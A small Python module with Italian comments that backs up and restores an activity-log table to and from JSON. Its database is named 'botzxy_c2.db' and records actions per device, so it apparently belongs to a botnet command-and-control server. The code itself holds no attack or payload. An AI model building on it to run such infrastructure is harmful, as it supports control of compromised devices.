import json
import os
import sqlite3
from datetime import datetime

LOG_FILE = 'database/logs_backup.json'

def backup_logs():
    """Salva i log in un file JSON di backup"""
    try:
        conn = sqlite3.connect('database/botzxy_c2.db')
        conn.row_factory = sqlite3.Row
        logs = conn.execute('SELECT * FROM logs ORDER BY id DESC LIMIT 1000').fetchall()
        conn.close()
        
        if logs:
            with open(LOG_FILE, 'w') as f:
                json.dump([dict(l) for l in logs], f, default=str)
            print(f"[+] Logs backup: {len(logs)} log salvati")
            return True
    except Exception as e:
        print(f"[-] Backup logs error: {e}")
        return False

def restore_logs():
    """Ripristina i log dal file di backup"""
    if not os.path.exists(LOG_FILE):
        return
    
    try:
        with open(LOG_FILE, 'r') as f:
            logs = json.load(f)
        
        conn = sqlite3.connect('database/botzxy_c2.db')
        cursor = conn.cursor()
        
        for log in logs:
            cursor.execute('''
                INSERT OR IGNORE INTO logs (id, device_id, action, details, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (log.get('id'), log.get('device_id'), log.get('action'), log.get('details'), log.get('timestamp')))
        
        conn.commit()
        conn.close()
        print(f"[+] Logs restored: {len(logs)} log ripristinati")
    except Exception as e:
        print(f"[-] Restore logs error: {e}")